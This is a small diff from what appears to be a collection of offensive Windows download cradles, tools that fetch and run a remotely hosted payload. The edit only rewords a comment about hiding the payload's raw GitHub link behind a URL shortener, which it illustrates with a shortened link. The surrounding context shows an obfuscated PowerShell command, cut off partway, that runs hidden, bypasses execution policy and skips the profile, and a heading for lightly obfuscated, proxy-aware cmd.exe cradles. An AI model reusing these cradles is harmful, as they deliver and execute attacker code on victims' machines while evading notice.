@@ -9,7 +9,7 @@ cmd> pOWeRshell -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object 
 
 
 # Proxy aware download cradles, which can be executed in a Windows Command Shell (cmd.exe)  
-# Info: Because you are limited in length, you have to use a shortcut link to the raw link from your hosted payload on Github
+# Info: I use a shortcut link to the raw link from your hosted payload on Github
 # For example, https://cutt.ly/syFzILH directs to the raw link of hosted payload on github
 
 # Windows Command Shell download cradles, proxy aware ligthly obfuscated 
